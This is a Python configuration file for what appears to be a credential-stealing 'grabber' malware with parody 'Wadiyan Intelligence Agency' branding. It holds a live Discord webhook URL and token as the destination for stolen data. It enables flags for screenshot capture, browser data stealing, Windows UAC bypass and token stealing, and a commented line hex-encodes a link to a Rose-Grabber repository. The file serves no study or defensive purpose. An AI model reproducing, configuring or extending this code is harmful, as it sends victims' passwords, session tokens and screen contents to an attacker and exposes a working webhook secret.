class Config:
    def __init__(self):
        self.webhook = 'https://discord.com/api/webhooks/1335610082582331545/tv6RrG3rRYiBDVKun7ay_hwkHdknWXmweXgAy3dzu7oXWKgXmPgBu6nXBCpqlDyf4-wE'
        self.eb_color = int("\x31\x36\x37\x31\x31\x36\x38\x30")
        self.eb_footer = "All done by the Great Supreme Leader. No mogas will be tolerated."
        self.wh_avatar = "https://raw.githubusercontent.com/adolfhustler/Aladeen/main/Flag_of_Wadiya.gif"
        #self.wh_avatar = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x25\x32\x34\x72\x6f\x73\x65\x2d\x77\x68\x2e\x70\x6e\x67"
        self.wh_name = "The Wadiyan Intelligence Agency"
        self.screenshot = True
        self.browser_stealing = True
        self.uac_bypass = True
        self.tokenstealing = True
        self.debug_mode = True



    def get_webhook(self):
        return self.webhook

    def get_color(self):
        return self.eb_color
    
    def get_footer(self):
        return self.eb_footer


    def get_avatar(self):
        return self.wh_avatar

    def get_name(self):
        return self.wh_name
    
    def get_screenshot(self):
        return self.screenshot
    def get_browser_stealing(self):
        return self.browser_stealing
    def get_uac_bypass(self):
        return self.uac_bypass

    def get_token_stealing(self):
        return self.tokenstealing
    
    def get_debug_mode(self):
        return self.debug_mode
